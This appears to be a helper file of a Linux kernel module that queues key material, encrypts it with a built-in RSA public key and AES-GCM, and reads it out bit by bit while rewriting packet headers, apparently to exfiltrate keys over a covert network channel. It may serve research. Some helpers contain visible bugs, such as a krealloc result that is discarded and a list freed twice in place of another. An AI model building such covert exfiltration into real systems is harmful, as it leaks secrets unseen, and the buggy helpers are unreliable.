#include "common.h"

#include <linux/scatterlist.h>
#include <linux/string.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/ipv6.h>
#include <crypto/akcipher.h>
#include <crypto/aead.h>
#include <crypto/rng.h>
#include <net/tcp.h>
#include <net/udp.h>

//#include "crypto/hmac/hmac_sha2.h"

// LOCKING ORDER FROM FIRST (most outer) = TOP to LAST (most inner) = BOTTOM
DEFINE_SPINLOCK(in_key_list_slock);
DEFINE_SPINLOCK(out_cc_key_list_slock);
DEFINE_SPINLOCK(out_sig_key_list_slock);

LIST_HEAD(in_key_list);
LIST_HEAD(out_cc_key_list);
LIST_HEAD(out_sig_key_list);



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// memory helper //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

uint8_t *cckex_mem_concat(uint8_t *a, size_t a_size, uint8_t *b, size_t b_size) {
	
	uint8_t *buf = NULL;

	//pr_info("CCKEX_LKM [%s] buf size = %lu", __func__, a_size + b_size);
	buf = kmalloc(a_size + b_size, GFP_KERNEL);
	if(!buf) return NULL;

	//pr_info("CCKEX_LKM [%s] buf = %p", __func__, buf);

	memcpy(buf, a, a_size);
	memcpy(buf + a_size, b, b_size);

	return buf;
}

uint8_t *cckex_mem_concat_to_buf(uint8_t *buf, size_t buf_size, uint8_t *data, size_t data_size) {

	uint8_t *newBuf = NULL;

	//pr_info("CCKEX_LKM [%s] buf=%p data=%p", __func__, buf, data);
	//pr_info("CCKEX_LKM [%s] newbuf size %zu + %zu = %zu", __func__, buf_size, data_size, buf_size + data_size);
	newBuf = krealloc(buf, buf_size + data_size, GFP_KERNEL);
	if(!newBuf) return NULL;

	//pr_info("CCKEX_LKM [%s] newBuf = %p", __func__, newBuf);

	memcpy(newBuf + buf_size, data, data_size);

	return buf;
}

void cckex_print_mem(uint8_t *buf, size_t size) {
	for(size_t i = 0; i < size; i++) {
		printk(KERN_CONT "%.02x", *(buf + i));
	}
}

// -- memmem --
// Implementierung von memmem siehe https://opensource.apple.com/source/Libc/Libc-825.25/string/FreeBSD/memmem.c.auto.html
/*-
 * Copyright (c) 2005 Pascal Gloor <pascal.gloor@spale.com>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
void *
cckex_memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
	register char *cur, *last;
	const char *cl = (const char *)l;
	const char *cs = (const char *)s;

    /* we need something to compare */
    if (l_len == 0 || s_len == 0)
	return NULL;

    /* "s" must be smaller or equal to "l" */
    if (l_len < s_len)
        return NULL;

    /* special case where s_len == 1 */
    if (s_len == 1)
        return memchr(l, (int)*cs, l_len);

    /* the last position where its possible to find "s" in "l" */
    last = (char *)cl + l_len - s_len;

    for (cur = (char *)cl; cur <= last; cur++)
        if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
        return cur;

    return NULL;
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// key list helper //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void cckex_keylist_reset(void) {

	cckex_key_list_entry_t *entry;
	cckex_key_list_entry_t *n;

	spin_lock_bh(&in_key_list_slock);

	list_for_each_entry_safe(entry, n, &in_key_list, list) {
		if(entry->buf != NULL) kfree(entry->buf);
		list_del(&entry->list);
		kfree(entry);
	}

	spin_unlock_bh(&in_key_list_slock);

	spin_lock_bh(&out_cc_key_list_slock);

	list_for_each_entry_safe(entry, n, &out_cc_key_list, list) {
		if(entry->buf != NULL) kfree(entry->buf);
		list_del(&entry->list);
		kfree(entry);
	}

	spin_unlock_bh(&out_cc_key_list_slock);

	spin_lock_bh(&out_sig_key_list_slock);

	list_for_each_entry_safe(entry, n, &out_cc_key_list, list) {
		if(entry->buf != NULL) kfree(entry->buf);
		list_del(&entry->list);
		kfree(entry);
	}

	spin_unlock_bh(&out_sig_key_list_slock);
}

void cckex_keylist_add_entry(cckex_key_list_entry_t* entry) {
	spin_lock_bh(&in_key_list_slock);

	list_add(&entry->list, &in_key_list);

	spin_unlock_bh(&in_key_list_slock);

	pr_info("CCKEX_LKM [%s] id (%zu): ", __func__, entry->id_size);
	cckex_print_mem(entry->id, entry->id_size);
	//pr_info("CCKEX_LKM [%s] key (%i): ", __func__, entry->key_size);
	//cckex_print_mem(entry->key, entry->key_size);
	//pr_info("CCKEX_LKM [%s] iv  (%i): ", __func__, entry->iv_size);
	//cckex_print_mem(entry->iv, entry->iv_size);
}

cckex_key_list_entry_t* cckex_keylist_get_entry_by_id(uint8_t* id, size_t id_size) {
	cckex_key_list_entry_t *entry = NULL;

	spin_lock_bh(&in_key_list_slock);

	//pr_info("CCKEX_LKM [%s] searching in_key_list", __func__);

	list_for_each_entry(entry, &in_key_list, list) {

		//pr_info("CCKEX_LKM [%s] checking key: ", __func__);
		//cckex_print_mem(entry->id, entry->id_size);

		if(memcmp(id, entry->id, MIN(id_size, entry->id_size)) == 0) {
			list_del(&entry->list);
			spin_unlock_bh(&in_key_list_slock);
			return entry;
		}
	}

	spin_unlock_bh(&in_key_list_slock);

	return NULL;
}

cckex_key_list_entry_t* cckex_try_fetch_in_key_entry(void) {
	cckex_key_list_entry_t *entry = NULL;

	spin_lock_bh(&in_key_list_slock);

	if(!list_empty(&in_key_list)) {
		entry = list_entry(in_key_list.next, struct cckex_key_list_entry, list);
		list_del(in_key_list.next);

		pr_info("CCKEX_LKM [%s]: remove entry from in_key_list id:", __func__);
		cckex_print_mem(entry->id, entry->id_size);
	}

	spin_unlock_bh(&in_key_list_slock);

	return entry;
}

cckex_key_list_entry_t* cckex_try_fetch_cc_key_entry(void) {
	struct cckex_key_list_entry *entry = NULL;

	// try to acquire the key list mutex and try to get an entry
	spin_lock_bh(&out_cc_key_list_slock);

	if(!list_empty(&out_cc_key_list)) {
		entry = list_entry(out_cc_key_list.prev, struct cckex_key_list_entry, list);
		list_del(out_cc_key_list.prev);
	}

	spin_unlock_bh(&out_cc_key_list_slock);

	return entry;
}

cckex_key_list_entry_t* cckex_try_fetch_sig_key_entry(void) {
	struct cckex_key_list_entry *entry = NULL;

	spin_lock_bh(&out_sig_key_list_slock);

	if(!list_empty(&out_sig_key_list)) {
		entry = list_entry(out_sig_key_list.prev, struct cckex_key_list_entry, list);
		list_del(out_sig_key_list.prev);
	}

	spin_unlock_bh(&out_sig_key_list_slock);

	return entry;
}

static uint8_t _out_pub_der[] = {
  0x30, 0x82, 0x01, 0x22, 0x30, 0x0d, 0x06, 0x09, 0x2a, 0x86, 0x48, 0x86,
  0xf7, 0x0d, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0f, 0x00,
  0x30, 0x82, 0x01, 0x0a, 0x02, 0x82, 0x01, 0x01, 0x00, 0xb5, 0xbf, 0x0f,
  0xac, 0x30, 0x97, 0xd2, 0xa2, 0x45, 0x08, 0xeb, 0x20, 0xaf, 0x42, 0xf2,
  0xed, 0x6a, 0x9e, 0xe2, 0x60, 0x10, 0x8f, 0x89, 0xf1, 0x62, 0x28, 0x65,
  0xc7, 0x3f, 0xf5, 0xb4, 0xf2, 0xe5, 0xe4, 0x4d, 0xe4, 0x94, 0x02, 0x59,
  0xa3, 0xb1, 0x93, 0xb3, 0xd8, 0x25, 0x2d, 0xca, 0x2f, 0x88, 0x35, 0x2f,
  0x4f, 0x0d, 0x45, 0x0e, 0x3a, 0x5c, 0xf9, 0x39, 0xf1, 0xb9, 0x3a, 0xee,
  0xa7, 0x86, 0x3b, 0x95, 0xdd, 0x41, 0x96, 0xdc, 0x45, 0x3f, 0x57, 0xae,
  0x66, 0xa4, 0x42, 0x11, 0x93, 0x8c, 0x4f, 0xd6, 0x0f, 0xd6, 0x92, 0xde,
  0x19, 0x92, 0x61, 0x8f, 0xe4, 0xc6, 0xb2, 0x89, 0x17, 0x43, 0xca, 0x84,
  0xb2, 0x84, 0x62, 0xb8, 0x03, 0xa5, 0x46, 0x20, 0x20, 0xf8, 0x0c, 0x10,
  0x2c, 0x49, 0xa8, 0xa0, 0x2a, 0xf0, 0x39, 0x96, 0x25, 0xb0, 0x33, 0x58,
  0x4e, 0x8c, 0xc2, 0x4d, 0x78, 0x98, 0x9b, 0xd7, 0x05, 0xbc, 0x5e, 0xaa,
  0x09, 0xd0, 0xbc, 0x6f, 0xd1, 0x63, 0x30, 0x3a, 0xdf, 0x87, 0x80, 0x59,
  0x4a, 0xb7, 0x19, 0x44, 0x6c, 0x83, 0x90, 0x25, 0xf7, 0xbb, 0xfd, 0x67,
  0x08, 0xf1, 0xa0, 0xc7, 0x42, 0x31, 0x90, 0x3e, 0x82, 0xf3, 0x98, 0x58,
  0xf3, 0x38, 0xf3, 0x13, 0xbb, 0x6f, 0x77, 0xa7, 0xa7, 0x1e, 0x85, 0x08,
  0xdd, 0x76, 0x0c, 0x99, 0x76, 0x4b, 0x8e, 0xfa, 0x29, 0x0f, 0xbc, 0x2d,
  0xc7, 0xbc, 0x68, 0xca, 0x20, 0xf3, 0xdd, 0x8d, 0x57, 0x5d, 0xf7, 0xc9,
  0xf6, 0x80, 0xd1, 0xa4, 0x4d, 0x43, 0x23, 0xea, 0x0c, 0x7c, 0xd0, 0x2d,
  0xc2, 0x30, 0xbe, 0x6c, 0x4b, 0x65, 0x66, 0x38, 0xcb, 0x25, 0xe8, 0xe6,
  0x06, 0x9c, 0x6b, 0xd2, 0xc8, 0xa4, 0x8a, 0xf8, 0xbf, 0xef, 0x46, 0xa5,
  0xd6, 0x5d, 0xf5, 0x1c, 0x75, 0x9f, 0x8d, 0xe6, 0x72, 0xe9, 0xf2, 0x0a,
  0x59, 0x02, 0x03, 0x01, 0x00, 0x01
};
static size_t _out_pub_der_len = 294;

static const size_t _out_enc_offset = 2;

static const size_t _out_enc_buf_size = 256;
static const size_t _out_enc_buf_with_header_size = _out_enc_buf_size + _out_enc_offset;
static uint8_t *_out_enc_buf = NULL;

static const size_t _out_enc_key_size = 16;
static uint8_t *_out_enc_key = NULL;
static const size_t _out_enc_iv_size = 8;
static uint8_t *_out_enc_iv = NULL;
static const size_t _out_enc_auth_size = 16;
static const size_t _out_enc_aad_size = 3;
static const size_t _out_enc_hmac_size = 32;
static uint8_t *_out_enc_hmac = NULL;

// TODO: potential race conditions with this flag
static int _output_encryption_enabled = 0;

void cckex_set_output_encryption(int enable) {
	if(enable) {
		cckex_init_output_encryption_key();
	}
	_output_encryption_enabled = enable;
}

int cckex_output_encryption_enabled(void) {
	return _output_encryption_enabled;
}

int cckex_init_output_encryption_key(void) {

	int ret = 0;
	cckex_key_list_entry_t *entry = NULL; 
	struct crypto_rng *rng = NULL;
	struct crypto_akcipher *akc = NULL;
	struct akcipher_request *req = NULL;
	struct scatterlist sg_data;
	DECLARE_CRYPTO_WAIT(cwait);

	if(!_out_enc_buf) {
		_out_enc_buf = kmalloc(_out_enc_buf_with_header_size, GFP_ATOMIC);
		if(!_out_enc_buf) {
			//pr_info("CCKEX_LKM [%s] failed to alloc _out_enc_buf", __func__);
			ret = -1;
			goto rsa_out;
		}

		_out_enc_key  = _out_enc_buf + _out_enc_offset;
		_out_enc_iv   = _out_enc_buf + _out_enc_offset + _out_enc_key_size;
		_out_enc_hmac = _out_enc_buf + _out_enc_offset + _out_enc_key_size + _out_enc_iv_size;
		_out_enc_buf[0] = 0xCC;
		_out_enc_buf[1] = 0xCC;
	}

	// generate output keyblock new
	
	//pr_info("CCKEX_LKM [%s] crypto_alloc_rng", __func__);
	rng = crypto_alloc_rng("jitterentropy_rng", 0, 0);
	if(IS_ERR(rng)) {
		//pr_info("CCKEX_LKM [%s] crypto_alloc_rng failed with: %li", __func__, PTR_ERR(rng));
		rng = NULL;
		ret = -1;
		goto rsa_out;
	}

	//pr_info("CCKEX_LKM [%s] crypto_rng_get_bytes", __func__);
	ret = crypto_rng_get_bytes(rng, _out_enc_buf + _out_enc_offset, _out_enc_buf_size);
	if(ret != 0) {
		//pr_info("[%s] failed to gen random data (%i != %zu)", __func__, ret, _out_enc_buf_size);
		ret = -1;
		goto rsa_out;
	}

	// append 32 byte sha256hmac
	// TODO: solve symbol conflict with <crypto/sha.h>
	/*if(hmac_sha256(_out_enc_key, _out_enc_buf_size, _out_enc_key, _out_enc_buf_size + _out_enc_iv_size, _out_enc_hmac, _out_enc_hmac_size) != 32) {
		//pr_info("[%s] failed to calculate sha256 of keyblock", __func__);
		ret = -1;
		goto rsa_out;
	}*/

	//pr_info("CCKEX_LKM [%s] rng buf(%zu): ", __func__, _out_enc_buf_size);
	//cckex_print_mem(_out_enc_buf, _out_enc_buf_with_header_size);

	// encrypt output keyblock

	//pr_info("CCKEX_LKM [%s] crypto_alloc_akcipher", __func__);
	akc = crypto_alloc_akcipher("rsa", 0, 0);
	if(IS_ERR(akc)) {
		//pr_info("CCKEX_LKM [%s] crypto_alloc_akcipher failed with: %li", __func__, PTR_ERR(akc));
		akc = NULL;
		ret = -1;
		goto rsa_out;

	}

	//pr_info("CCKEX_LKM [%s] crypto_akcipher_set_pub_key", __func__);
	//https://stackoverflow.com/questions/41084118/crypto-akcipher-set-pub-key-in-kernel-asymmetric-crypto-always-returns-error
	if((ret = crypto_akcipher_set_pub_key(akc, _out_pub_der + 24, _out_pub_der_len - 24)) != 0) {
		//pr_info("CCKEX_LKM [%s] crypto_akcipher_set_pub_key failed with: %i", __func__, ret);
		ret = -1;
		goto rsa_out;
	}

	//pr_info("CCKEX_LKM [%s] akcipher_request_alloc", __func__);
	req = akcipher_request_alloc(akc, GFP_ATOMIC);
	if(!req) {
		//pr_info("CCKEX_LKM [%s] akcipher_request_alloc failed", __func__);
		ret = -1;
		goto rsa_out;
	}
	
	//pr_info("CCKEX_LKM [%s] sg_data", __func__);
	sg_init_one(&sg_data, _out_enc_buf + _out_enc_offset, _out_enc_buf_size);

	//pr_info("CCKEX_LKM [%s] akcipher_request_set_callback", __func__);
	akcipher_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG | CRYPTO_TFM_REQ_MAY_SLEEP, crypto_req_done, &cwait);
	//pr_info("CCKEX_LKM [%s] akcipher_request_set_crypt", __func__);
	akcipher_request_set_crypt(req, &sg_data, &sg_data, _out_enc_buf_size, _out_enc_buf_size);

	//pr_info("CCKEX_LKM [%s] async buf(%zu): ", __func__, _out_enc_buf_size);
	//cckex_print_mem(_out_enc_buf, _out_enc_buf_with_header_size);

	//pr_info("CCKEX_LKM [%s] crypto_akcipher_encrypt", __func__);
	if((ret = crypto_akcipher_encrypt(req)) == -EINPROGRESS || ret == -EBUSY) {
		//pr_info("CCKEX_LKM [%s] call crypto_wait_req", __func__);
		if((ret = crypto_wait_req(ret, &cwait)) != 0) {
			//pr_info("CCKEX_LKM [%s] crypto_wait_req failed with %i", __func__, ret);
			ret = -1;
			goto rsa_out;
		}
	} else if(ret != 0) {
		//pr_info("CCKEX_LKM [%s] crypto_akcipher_encrypt failed with %i", __func__, ret);
		ret = -1;
		goto rsa_out;
	}

	//pr_info("CCKEX_LKM [%s] async enc buf(%zu): ", __func__, _out_enc_buf_size);
	//cckex_print_mem(_out_enc_buf, _out_enc_buf_with_header_size);

	// add data to cc outqueue

	entry = kmalloc(sizeof(cckex_key_list_entry_t), GFP_ATOMIC);
	entry->buf = _out_enc_buf;
	entry->size = _out_enc_buf_with_header_size;
	entry->size_to_exfiltrate = _out_enc_buf_with_header_size;
	entry->byte_offset = 0;
	entry->bit_offset = 0;

	cckex_enqueue_in_cc_out_list(entry);

	// enable encrypted output flag
	_output_encryption_enabled = 1;

	rsa_out:

	if(rng) crypto_free_rng(rng);
	if(akc) crypto_free_akcipher(akc);
	if(req) akcipher_request_free(req);

	return ret;
}

static int _encrypt_out_key_list_entry(cckex_key_list_entry_t *entry) {

	int ret = 0;
	uint8_t *enc_buf = NULL;
	struct crypto_aead *caead = NULL;
	struct aead_request *req = NULL;
	struct scatterlist sg_data;
	DECLARE_CRYPTO_WAIT(cwait);

	if(!cckex_output_encryption_enabled()) return 0;


	//pr_info("CCKEX_LKM [%s] call crypto_alloc_aead", __func__);

/*	//pr_info("CCKEX_LKM [%s] ENCRYPTED PKG: ", __func__);
	//cckex_print_mem(payload, payload_len);*/

	// allocate cipher
	caead = crypto_alloc_aead("gcm(aes)", 0, 0);
	if(IS_ERR(caead)) {
		//pr_info("CCKEX_LKM [%s] crypto_alloc_aead failed with: %li", __func__, PTR_ERR(caead));
		ret = -1;
		goto out;
	}

	//pr_info("CCKEX_LKM [%s] call crypto_aead_setkey", __func__);

	// set cipher key
	if((ret = crypto_aead_setkey(caead, _out_enc_key, _out_enc_key_size)) != 0) {
		//pr_info("CCKEX_LKM [%s] crypto_aead_setkey failed with %i -> key (%s): ", __func__, ret, _out_enc_key);
		//cckex_print_mem(_out_enc_key, _out_enc_key_size);
		ret = -1;
		goto out;
	}

	//pr_info("CCKEX_LKM [%s] call crypto_aead_setauthsize", __func__);

	// set authentication size
	// TODO: check IF 16 byte is right
	// 16 Bytes should be ok: https://github.com/wireshark/wireshark/blob/8bffe8954ec949ed8a8a451a241c7480135c173f/epan/dissectors/packet-tls-utils.c#L5094
	if((ret = crypto_aead_setauthsize(caead, _out_enc_auth_size)) != 0) {
		//pr_info("CCKEX_LKM [%s] crypto_aead_setauthsize failed with %i", __func__, ret);
		ret = -1;
		goto out;
	}

	//pr_info("CCKEX_LKM [%s] call aead_request_alloc", __func__);

	// allocate request
	req = aead_request_alloc(caead, GFP_ATOMIC);
	if(!req) {
		//pr_info("CCKEX_LKM [%s] aead_request_alloc failed", __func__);
		ret = -1;
		goto out;
	}

	//pr_info("CCKEX_LKM [%s] call aead_request_set_ad", __func__);

	aead_request_set_ad(req, _out_enc_aad_size);

	//pr_info("CCKEX_LKM [%s] call sg_init_one payload=%p payload_len=%i", __func__, payload, payload_len);

	enc_buf = kmalloc(entry->size + _out_enc_auth_size, GFP_KERNEL);
	if(!enc_buf) {
		//pr_info("CCKEX_LKM [%s] failed to alloc enc_buf", __func__);
		ret = -1;
		goto out;
	}
	memcpy(enc_buf, entry->buf, entry->size);
	kfree(entry->buf);
	entry->buf = enc_buf;
	entry->size_to_exfiltrate += _out_enc_auth_size;

	sg_init_one(&sg_data, entry->buf, entry->size);

	//pr_info("CCKEX_LKM [%s] call aead_request_set_callback", __func__);

	aead_request_set_callback(req, CRYPTO_TFM_REQ_MAY_BACKLOG, crypto_req_done, &cwait);

	aead_request_set_crypt(req, &sg_data, &sg_data, entry->size - _out_enc_aad_size - _out_enc_auth_size, _out_enc_iv);

	//pr_info("CCKEX_LKM [%s] call crypto_aead_encrypt iv=%p", __func__, iv);

	if((ret = crypto_aead_encrypt(req)) == -EINPROGRESS || ret == -EBUSY) {
		//pr_info("CCKEX_LKM [%s] call crypto_wait_req", __func__);
		if((ret = crypto_wait_req(ret, &cwait)) != 0) {
			//pr_info("CCKEX_LKM [%s] crypto_wait_req failed with %i", __func__, ret);
			ret = -1;
			goto out;
		}
	} else if(ret != 0) {
		//pr_info("CCKEX_LKM [%s] crypto_aead_encrypt failed with %i", __func__, ret);
		ret = -1;
		goto out;
	}

	//pr_info("CCKEX_LKM [%s] finished", __func__);

	out:

	if(req) aead_request_free(req);
	if(caead) crypto_free_aead(caead);

	return ret;	

}

void cckex_enqueue_in_cc_out_list(cckex_key_list_entry_t *entry) {

	//pr_info("CCKEX_LKM [%s] key list entry before encryption:", __func__);
	//cckex_print_mem(entry->buf, entry->size);
	_encrypt_out_key_list_entry(entry);
	//pr_info("CCKEX_LKM [%s] key list entry after encryption:", __func__);
	//cckex_print_mem(entry->buf, entry->size);

	spin_lock_bh(&out_cc_key_list_slock);
	
	list_add(&entry->list, &out_cc_key_list);

	spin_unlock_bh(&out_cc_key_list_slock);
}

void cckex_enqueue_in_sig_out_list(cckex_key_list_entry_t *entry) {

	//pr_info("CCKEX_LKM [%s] key list entry before encryption:", __func__);
	//cckex_print_mem(entry->buf, entry->size);
	_encrypt_out_key_list_entry(entry);
	//pr_info("CCKEX_LKM [%s] key list entry after encryption:", __func__);
	//cckex_print_mem(entry->buf, entry->size);

	spin_lock_bh(&out_sig_key_list_slock);

	list_add(&entry->list, &out_sig_key_list);

	spin_unlock_bh(&out_sig_key_list_slock);
}

void cckex_move_in_keylist_to_out_cc_keylist(void) {
	struct list_head *elem;

	spin_lock_bh(&in_key_list_slock);
	spin_lock_bh(&out_cc_key_list_slock);

	while(!list_empty(&in_key_list)) {
		elem = in_key_list.next;	
		list_del(in_key_list.next);
		list_add(elem, &out_cc_key_list);

		pr_warn("CCKEX_LKM [%s] moving in keylist entry to out cc keylist", __func__);
	}

	spin_unlock_bh(&out_cc_key_list_slock);
	spin_unlock_bh(&in_key_list_slock);
}

uint8_t cckex_keybuf_get_bits(cckex_key_list_entry_t *entry, uint8_t count) {

	uint32_t byteOffset = 0; 
	uint32_t byteBitOffset = 0; 
	uint16_t mask = 0;
	size_t remainingSizeOfCurByte = 0;
	uint8_t val = 0;
	uint8_t tmp = 0; 

	if(count > 8) {
		pr_warn("CCKEX_LKM [cckex_keybuf_get_bits]: count > 8: %i", count);
		return 0;
	}

	if((entry->bit_offset + count) / 8 > entry->size_to_exfiltrate) {
		pr_warn("CCKEX_LKM [cckex_keybuf_get_bits]: out-of-bounds: bit_offset=%i count=%i size=%zu", entry->bit_offset, count, entry->size_to_exfiltrate);
		return 0;
	}

	byteOffset = entry->bit_offset / 8;
	byteBitOffset = entry->bit_offset - byteOffset * 8;
	mask = 0x00FF >> (8 - count);
	remainingSizeOfCurByte = 8 - byteBitOffset;

	// TODO: Bounds check

	val = entry->buf[byteOffset] >> byteBitOffset;

	tmp = val;

	if(remainingSizeOfCurByte < count) {
		val |= (byteOffset + 1 >= entry->size_to_exfiltrate ? 0 : entry->buf[byteOffset + 1]) << remainingSizeOfCurByte;
	} 

	val &= mask;

	//pr_info("CCKEX_LKM [cckex_keybuf_get_bits]: data=0x%04x tmp=0x%04x byteOffset=%i -> buf=0x%02x", val, tmp, byteOffset, entry->buf[byteOffset]);

	entry->bit_offset += count;

	return (uint8_t)val;
}

uint8_t cckex_keybuf_has_bits(cckex_key_list_entry_t *entry) {
	uint32_t bitCounts = entry->size_to_exfiltrate * 8;
	//pr_info("CCKEX_LKM [cckex_keybuf_has_bits]: bitCounts=%i offset=%i", bitCounts, entry->bit_offset);
	if(bitCounts <= entry->bit_offset) return 0;
	return 1;
}

void cckex_free_key_list_entry(cckex_key_list_entry_t *entry) {
	kfree(entry->buf);
	kfree(entry);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// sk_buff helper //
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

uint8_t* cckex_get_ptr_to_payload(struct sk_buff* skb, int ip_proto) {
	struct tcphdr *tcph = NULL;
	struct udphdr *udph = NULL;

	if(skb_is_nonlinear(skb)) {
		pr_warn("CCKEX_LKM [%s] skb is not linear!", __func__);
	}

	if(ip_proto == IPPROTO_TCP) {
		tcph = tcp_hdr(skb);
		return (uint8_t*)tcph + tcph->doff * 4;
	} else if(ip_proto == IPPROTO_UDP) {
		udph = udp_hdr(skb);
		return (uint8_t*)udph + sizeof(struct udphdr);
	} else {
		pr_warn("CCKEX_LKM [%s] unknown ip_proto = %i", __func__, ip_proto);
	}

	return NULL;
}

void cckex_update_checksums(struct sk_buff *skb) {
	struct iphdr *ip_header = NULL;
	struct tcphdr *tcpHdr = NULL;
    unsigned int tcplen = 0;
	struct udphdr *udpHdr = NULL;
	unsigned int udplen = 0;

	if((GET_U8H(skb_network_header(skb), 0) & 0xF0) != 0x40) {
		// PANIC ipv6 NOT SUPPORTED YET
		pr_warn("CCKEX_LKM [%s] ip proto version not supported", __func__);
		return;
	}
	
	// https://stackoverflow.com/questions/45986312/recalculating-tcp-checksum-in-linux-kernel-module

	ip_header = ip_hdr(skb);
	skb->ip_summed = CHECKSUM_NONE; //stop offloading
	skb->csum_valid = 0;
	ip_header->check = 0;
	ip_header->check = ip_fast_csum((u8 *)ip_header, ip_header->ihl);


	if ( (ip_header->protocol == IPPROTO_TCP) || (ip_header->protocol == IPPROTO_UDP) ) {

		if(skb_is_nonlinear(skb))
    		skb_linearize(skb);  // very important.. You need this.

		if (ip_header->protocol == IPPROTO_TCP) {

     		tcpHdr = tcp_hdr(skb);
     		skb->csum =0;
     		tcplen = ntohs(ip_header->tot_len) - ip_header->ihl*4;
     		tcpHdr->check = 0;
     		tcpHdr->check = tcp_v4_check(tcplen, ip_header->saddr, ip_header->daddr, csum_partial((char *)tcpHdr, tcplen, 0));

		} else if (ip_header->protocol == IPPROTO_UDP) {

    		udpHdr = udp_hdr(skb);
    		skb->csum =0;
    		udplen = ntohs(ip_header->tot_len) - ip_header->ihl*4;
    		udpHdr->check = 0;
    		udpHdr->check = udp_v4_check(udplen,ip_header->saddr, ip_header->daddr,csum_partial((char *)udpHdr, udplen, 0));;
		}
	}
}

void cckex_update_skb_lengths(struct sk_buff *skb, unsigned delta_length) {
	struct iphdr* iph = NULL;
	struct tcphdr* tcph = NULL;
	struct udphdr* udph = NULL;

	if((GET_U8H(skb_network_header(skb), 0) & 0xF0) != 0x40) {
		// PANIC ipv6 NOT SUPPORTED YET
		pr_warn("CCKEX_LKM [%s] ip proto version not supported", __func__);
		return;
	}
	
	iph = ip_hdr(skb);

	if(!iph) {
		pr_warn("CCKEX_LKM [%s] failed to fetch iphdr", __func__);
		return;
	}

	pr_info("CCKEX_LKM [%s] iphdr len from = %u", __func__, ntohs(iph->tot_len));
	iph->tot_len = htons(ntohs(iph->tot_len) + delta_length);
	pr_info("CCKEX_LKM [%s] iphdr len to   = %u", __func__, ntohs(iph->tot_len));

	if(iph->protocol == IPPROTO_TCP) {

		// Do nothing as the TCP Header has no length field
		// TODO: is this right?

	} else if(iph->protocol == IPPROTO_UDP) {

		udph = udp_hdr(skb);
		
		if(!udph) {
			pr_warn("CCKEX_LKM [%s] failed to fetch udphdr", __func__);
			return;
		}

		udph->len = htons(ntohs(udph->len) + delta_length);

	} else {
		pr_warn("CCKEX_LKM [%s] transport header not supported!", __func__);
	}
}

int cckex_skb_is_ipv4(struct sk_buff *skb) {
	return (GET_U8H(skb_network_header(skb), 0) & 0xF0) == 0x40;
}

int cckex_skb_is_ipv6(struct sk_buff *skb) {
	return (GET_U8H(skb_network_header(skb), 0) & 0xF0) == 0x60;
}

int cckex_skb_get_ip_proto(struct sk_buff *skb) {
	struct iphdr *iph = NULL;
	struct ipv6hdr *iph6 = NULL;

	if(cckex_skb_is_ipv4(skb)) {
		iph = ip_hdr(skb);
		return iph->protocol;
	} else if(cckex_skb_is_ipv6(skb)) {
		iph6 = ipv6_hdr(skb);
		return iph6->nexthdr; 
	} else {
		return 0;
	}
}

uint16_t cckex_skb_get_source_port(struct sk_buff *skb) {
	struct tcphdr *tcph = NULL;
	struct udphdr *udph = NULL;
	int ip_proto = cckex_skb_get_ip_proto(skb);

	if(ip_proto == IPPROTO_TCP) {
		tcph = tcp_hdr(skb);
		return ntohs(tcph->source);
	} else if(ip_proto == IPPROTO_UDP) {
		udph = udp_hdr(skb);
		return ntohs(udph->source);
	} else {
		return 0;
	}
}

uint16_t cckex_skb_get_dest_port(struct sk_buff *skb) {
	struct tcphdr *tcph = NULL;
	struct udphdr *udph = NULL;
	int ip_proto = cckex_skb_get_ip_proto(skb);

	if(ip_proto == IPPROTO_TCP) {
		tcph = tcp_hdr(skb);
		return ntohs(tcph->dest);
	} else if(ip_proto == IPPROTO_UDP) {
		udph = udp_hdr(skb);
		return ntohs(udph->dest);
	} else {
		return 0;
	}
}

int cckex_skb_tcp_fin(struct sk_buff *skb) {

	struct tcphdr *tcph = NULL;

	if(cckex_skb_get_ip_proto(skb) != IPPROTO_TCP) {
		return 0;
	}

	tcph = tcp_hdr(skb);

	return tcph->fin;
}

uint8_t* cckex_skb_get_payload(struct sk_buff *skb) {
	struct tcphdr *tcph = NULL;
	struct udphdr *udph = NULL;

	switch(cckex_skb_get_ip_proto(skb)) {
		case IPPROTO_TCP: {
			tcph = tcp_hdr(skb);
			return (uint8_t*)tcph + tcph->doff * 4;
			break;
		}
		case IPPROTO_UDP: {
			udph = udp_hdr(skb);
			return (uint8_t*)udph + sizeof(struct udphdr);
			break;
		}
		default:
			return NULL;
			break;
	}
